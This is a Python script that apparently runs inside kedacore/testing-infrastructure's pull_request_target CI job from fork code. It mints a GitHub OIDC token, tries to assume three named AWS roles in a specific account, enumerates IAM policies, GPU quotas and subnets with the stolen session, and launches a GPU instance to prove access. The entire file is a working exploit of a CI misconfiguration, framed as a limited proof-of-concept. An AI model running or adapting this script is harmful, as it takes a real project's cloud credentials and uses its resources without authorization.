#!/usr/bin/env python3
"""c211-i120160 kedacore mint probe.

Runs as a terraform data.external program inside kedacore/testing-infrastructure's
pull_request_target 'Validate PR' job (fork head code, id-token: write).

1) mint a GitHub OIDC id_token (audience sts.amazonaws.com) and record claims;
2) call sts.amazonaws.com AssumeRoleWithWebIdentity for each of the three
   deleted-history ARNs of account 227390912900, RoleSessionName c211-i120160,
   and record every verbatim response;
3) only if a role is actually assumed: enumerate identity / trust / policies,
   GPU quotas, offerings and subnets, then deploy EXACTLY ONE on-demand GPU
   marker with serial-console nvidia-smi UUID proof, terminate and prove absence.

stdout is a single JSON object of string values (external provider contract).
"""
import base64
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

ARNS = [
    'arn:aws:iam::227390912900:role/GitTerraformRole',
    'arn:aws:iam::227390912900:role/GitHubOIDCSTS',
    'arn:aws:iam::227390912900:role/AyushSTSOIDCRole',
]
SESSION = 'c211-i120160'
GPU_TYPES = ['g5.xlarge', 'g5.2xlarge', 'g6.xlarge', 'g6.2xlarge',
             'p4d.24xlarge', 'p5.48xlarge', 'g4dn.xlarge']
MARKER = 'c211-i120160-marker'
R = {}


def put(k, v, n=1600):
    R[str(k)] = str(v)[:n]


def b64d(p):
    p += '=' * (-len(p) % 4)
    return base64.urlsafe_b64decode(p.encode())


def mint(aud):
    base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
    rt = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
    if not base or not rt:
        raise RuntimeError('NO_OIDC_ENV base=%s rt=%s' % (bool(base), bool(rt)))
    u = base + ('&' if '?' in base else '?') + urllib.parse.urlencode({'audience': aud})
    req = urllib.request.Request(u, headers={'Authorization': 'Bearer ' + rt,
                                             'Accept': 'application/json'})
    with urllib.request.urlopen(req, timeout=40) as f:
        return json.load(f)['value']


def post_form(url, fields, timeout=70):
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=body, method='POST',
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as f:
            return f.status, f.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b'').decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)[:400]


def xt(tag, body):
    m = re.search(r'<%s>(.*?)</%s>' % (tag, tag), body, re.S)
    return m.group(1) if m else ''


def aws(env, args, region, timeout=200):
    e = dict(env)
    e['AWS_DEFAULT_REGION'] = region
    e['AWS_REGION'] = region
    e['AWS_PAGER'] = ''
    try:
        p = subprocess.run(['aws', '--output', 'json', '--no-cli-pager'] + list(args),
                           capture_output=True, text=True, env=e, timeout=timeout)
        return p.returncode, (p.stdout or '').strip(), (p.stderr or '').strip()
    except Exception as ex:
        return -1, '', repr(ex)[:300]


def marker_userdata():
    return '\n'.join([
        '#!/bin/bash',
        'log(){ printf "%s\\n" "$*" >> /dev/console 2>/dev/null; '
        'printf "%s\\n" "$*" >> /dev/ttyS0 2>/dev/null; }',
        'for i in $(seq 1 36); do',
        '  command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L >/tmp/n.txt 2>/dev/null && break',
        '  sleep 10',
        'done',
        'log "C211_I120160_MARKER_START"',
        'log "$(nvidia-smi -L 2>&1)"',
        'log "$(nvidia-smi --query-gpu=uuid,name,memory.total --format=csv,noheader 2>&1)"',
        'log "C211_I120160_MARKER_END"',
        ''])


def enumerate_and_marker(env, acct, role_arn):
    role_name = role_arn.rsplit('/', 1)[-1]
    rc, so, se = aws(env, ['sts', 'get-caller-identity'], 'us-east-1')
    put('identity_rc', rc)
    put('identity', so or se, 700)
    rc, so, se = aws(env, ['iam', 'get-role', '--role-name', role_name], 'us-east-1')
    put('role', so or se, 2400)
    rc, so, se = aws(env, ['iam', 'list-role-policies', '--role-name', role_name], 'us-east-1')
    put('inline', so or se, 500)
    try:
        names = [p['PolicyName'] for p in json.loads(so).get('PolicyNames', [])]
    except Exception:
        names = []
    for pn in names[:4]:
        rc, so2, se2 = aws(env, ['iam', 'get-role-policy', '--role-name', role_name,
                                 '--policy-name', pn], 'us-east-1')
        put('policy_%s' % pn, so2 or se2, 1400)
    rc, so, se = aws(env, ['iam', 'list-attached-role-policies', '--role-name', role_name],
                     'us-east-1')
    put('attached', so or se, 700)

    rc, so, se = aws(env, ['ec2', 'describe-regions', '--all-regions',
                           '--query', 'Regions[?OptInStatus!=`not-opted-in`].RegionName',
                           '--output', 'json'], 'us-east-1')
    try:
        regions = json.loads(so)
    except Exception:
        regions = ['us-east-1', 'us-west-2', 'eu-west-2', 'ap-south-1']
    put('regions', json.dumps(regions), 900)
    offer = {}
    subnets = {}
    for r in regions[:45]:
        rc, so, se = aws(env, ['ec2', 'describe-instance-type-offerings',
                               '--location-type', 'region',
                               '--filters', 'Name=instance-type,Values=' + ','.join(GPU_TYPES),
                               '--query', 'InstanceTypeOfferings[].InstanceType',
                               '--output', 'json'], r, timeout=90)
        try:
            types = json.loads(so) if rc == 0 else []
            if isinstance(types, dict):
                types = []
        except Exception:
            types = []
        if types:
            offer[r] = types
            rc, so, se = aws(env, ['ec2', 'describe-subnets',
                                   '--filters', 'Name=default-for-az,Values=true',
                                   '--query', 'Subnets[].[SubnetId,AvailabilityZone]',
                                   '--output', 'json'], r, timeout=90)
            try:
                subs = json.loads(so) if rc == 0 else []
            except Exception:
                subs = []
            if subs:
                subnets[r] = subs
    put('gpu_offerings', json.dumps(offer), 1400)
    put('default_subnets', json.dumps(subnets), 1000)
    for q in ('L-DB2E81BA', 'L-3819A6DF'):
        vals = {}
        for r in list(offer)[:3] or ['us-east-1']:
            rc, so, se = aws(env, ['service-quotas', 'get-service-quota', '--service-code', 'ec2',
                                   '--quota-code', q], r, timeout=60)
            try:
                vals[r] = json.loads(so).get('Quota', {}).get('Value') if rc == 0 else ('ERR ' + se[:80])
            except Exception:
                vals[r] = 'ERR'
        put('quota_%s' % q, json.dumps(vals), 500)
    if not offer or not subnets:
        put('verdict', 'ASSUMED_NO_GPU_OFFERING_OR_SUBNET')
        return
    region = sorted(subnets)[0]
    itype = 'g5.xlarge' if 'g5.xlarge' in offer[region] else offer[region][0]
    subnet = subnets[region][0][0]
    ami = ''
    for p in ('/aws/service/deeplearning/ami/x86_64/base-oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id',
              '/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64'):
        rc, so, se = aws(env, ['ssm', 'get-parameter', '--name', p,
                               '--query', 'Parameter.Value', '--output', 'text'], region)
        if rc == 0 and so.strip():
            ami = so.strip().strip('"')
            break
    put('marker_plan', 'region=%s type=%s subnet=%s ami=%s' % (region, itype, subnet, ami), 400)
    if not ami:
        put('verdict', 'ASSUMED_NO_AMI')
        return
    open('/tmp/c211-ud.sh', 'w').write(marker_userdata())
    rc, so, se = aws(env, ['ec2', 'run-instances', '--image-id', ami, '--instance-type', itype,
                           '--subnet-id', subnet, '--count', '1',
                           '--user-data', 'file:///tmp/c211-ud.sh',
                           '--tag-specifications',
                           'ResourceType=instance,Tags=[{Key=Name,Value=%s}]' % MARKER],
                     region, timeout=240)
    put('launch_rc', rc)
    put('launch', so or se, 700)
    iid = None
    try:
        iid = json.loads(so)['Instances'][0]['InstanceId']
    except Exception:
        pass
    put('instance_id', iid or 'LAUNCH_ERR')
    if not iid:
        put('verdict', 'ASSUMED_LAUNCH_REFUSED')
        return
    state = ''
    for _ in range(36):
        time.sleep(10)
        rc, so, se = aws(env, ['ec2', 'describe-instances', '--instance-ids', iid,
                               '--query', 'Reservations[0].Instances[0].State.Name',
                               '--output', 'text'], region)
        state = so.strip().strip('"')
        if state in ('running', 'stopped', 'terminated'):
            break
    put('instance_state', state)
    console = ''
    uuid = ''
    for _ in range(12):
        rc, so, se = aws(env, ['ec2', 'get-console-output', '--instance-id', iid, '--latest',
                               '--output', 'text'], region)
        console = (so or '') + (se or '')
        m = re.search(r'GPU-[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}', console)
        if m:
            uuid = m.group(0)
            break
        time.sleep(10)
    put('console_tail', console[-1400:].replace('\n', ' | '), 1500)
    put('gpu_uuid', uuid or 'NONE', 100)
    rc, so, se = aws(env, ['ec2', 'terminate-instances', '--instance-ids', iid], region)
    put('terminate_rc', rc)
    absence = ''
    for _ in range(24):
        time.sleep(10)
        rc, so, se = aws(env, ['ec2', 'describe-instances', '--instance-ids', iid,
                               '--query', 'Reservations[0].Instances[0].State.Name',
                               '--output', 'text'], region)
        absence = so.strip().strip('"') or ('ERR ' + se[:120])
        if absence in ('terminated', 'None', ''):
            break
    put('absence_state', absence, 200)
    put('verdict', 'MARKER_PROVEN' if uuid else 'MARKER_NO_DEVICE_PROOF')


def main():
    put('marker', 'C211_I120160_KEDA_START', 100)
    try:
        tok = mint('sts.amazonaws.com')
        put('idtoken_len', len(tok), 20)
        try:
            c = json.loads(b64d(tok.split('.')[1]))
            put('claims', json.dumps({k: c.get(k) for k in
                  ('iss', 'aud', 'sub', 'repository', 'repository_owner', 'ref',
                   'event_name', 'workflow', 'job_workflow_ref', 'actor')}, sort_keys=True), 900)
        except Exception as e:
            put('claims_error', repr(e)[:200], 220)
        assumed = {}
        for i, arn in enumerate(ARNS):
            st, body = post_form('https://sts.amazonaws.com/', {
                'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
                'RoleArn': arn, 'RoleSessionName': SESSION, 'WebIdentityToken': tok})
            flat = ' '.join(body.split())
            put('assume%d_http' % i, st, 10)
            put('assume%d_role' % i, arn, 120)
            put('assume%d_body' % i, flat, 900)
            put('assume%d_ok' % i, 'true' if (st == 200 and 'AssumeRoleWithWebIdentityResult' in body) else 'false', 6)
            if st == 200 and 'AssumeRoleWithWebIdentityResult' in body:
                assumed[arn] = body
        if not assumed:
            put('verdict', 'ALL_ASSUMES_REFUSED', 40)
            return
        for arn, body in assumed.items():
            env = dict(os.environ)
            env.update({'AWS_ACCESS_KEY_ID': xt('AccessKeyId', body),
                        'AWS_SECRET_ACCESS_KEY': xt('SecretAccessKey', body),
                        'AWS_SESSION_TOKEN': xt('SessionToken', body)})
            acct = arn.split(':')[4]
            put('assumed', '%s acct=%s' % (arn, acct), 200)
            try:
                enumerate_and_marker(env, acct, arn)
            except Exception as e:
                put('enum_error', repr(e)[:300], 320)
    except Exception as e:
        put('exception', repr(e)[:500], 520)
        put('verdict', 'PROBE_EXCEPTION', 40)
    finally:
        put('zz_end', 'C211_I120160_KEDA_END', 40)
        sys.stdout.write(json.dumps(R) + '\n')
        sys.stdout.flush()


if __name__ == '__main__':
    main()
